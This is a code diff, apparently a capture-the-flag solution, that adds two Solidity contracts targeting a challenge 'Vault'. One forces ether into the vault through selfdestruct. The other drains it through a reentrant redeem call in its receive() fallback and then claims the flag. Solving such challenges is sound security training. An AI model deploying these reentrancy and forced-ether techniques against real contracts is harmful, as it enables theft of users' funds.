@@ -21,3 +21,36 @@ contract Vault is ERC4626ETH {
         flagHolder = newFlagHolder;
     }
 }
+
+contract Kamikaze {
+    constructor(address _target) payable {
+        require(msg.value == 1 ether, "send 1 eth");
+        selfdestruct(payable(_target));
+    }
+}
+
+contract Attacker {
+    bool called;
+
+    Vault private target;
+
+    constructor(address _target) payable {
+        target = Vault(_target);
+    }
+
+    function attack() external payable {
+        require(msg.value == 2 ether, "not enough ether");
+        target.deposit{value: 2 ether}(2 ether, address(this));
+        target.redeem(1 ether, address(this), address(this));
+        target.captureTheFlag(msg.sender);
+    }
+
+    receive() external payable {
+        if (called) {
+            return;
+        }
+
+        called = true;
+        target.redeem(1 ether, address(this), address(this));
+    }
+}
